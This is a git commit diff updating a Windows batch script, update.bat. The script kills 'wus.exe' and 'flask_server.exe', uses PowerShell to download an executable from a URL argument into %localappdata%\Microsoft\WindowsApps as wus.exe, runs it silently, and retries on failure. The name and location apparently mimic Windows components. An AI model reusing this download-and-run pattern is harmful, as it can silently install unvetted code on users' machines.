5bc35519579400b354cd94b5970cb71ba3697a04
KSGVIO <ampleevvlad11@gmail.com>
2025-10-25 18:53:45 +0300

    Update update.bat

--- update.bat
+++ update.bat
@@ -1,20 +1,36 @@
 @echo off
-taskkill /F /IM wus.exe
-taskkill /F /IM flask_server.exe
-del /f /q %localappdata%\Microsoft\WindowsApps\wus.exe
-powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
-%localappdata%\Microsoft\WindowsApps\wus.exe
-tasklist | find "wus" >nul
-timeout /t 10 /nobreak > nul
+setlocal
+
+:: Kill any old processes
+taskkill /F /IM wus.exe /T >nul 2>&1
+taskkill /F /IM flask_server.exe /T >nul 2>&1
+
+:: Delete old file if it exists
+del /f /q "%localappdata%\Microsoft\WindowsApps\wus.exe" >nul 2>&1
+
+:: Download new file
+powershell -NoProfile -Command "iwr -Uri '%~1' -OutFile '$env:LOCALAPPDATA\Microsoft\WindowsApps\wus.exe'"
+
+:: Run the downloaded file
+start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"
+
+:: Wait 10 seconds
+timeout /t 10 /nobreak >nul
+
+:: Check if it's running
+tasklist | find /I "wus.exe" >nul
 if %errorlevel%==0 (
-    exit
+    echo wus.exe is running.
+    exit /b 0
 ) else (
-   if exist "%localappdata%\Microsoft\WindowsApps\wus.exe" (
-      %localappdata%\Microsoft\WindowsApps\wus.exe
-   ) else (
-      powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
-   )
-    
+    echo wus.exe not running, retrying...
+    if exist "%localappdata%\Microsoft\WindowsApps\wus.exe" (
+        start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"
+    ) else (
+        echo Re-downloading wus.exe...
+        powershell -NoProfile -Command "iwr -Uri '%~1' -OutFile '$env:LOCALAPPDATA\Microsoft\WindowsApps\wus.exe'"
+        start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"
+    )
 )
 
-exit
+exit /b 0
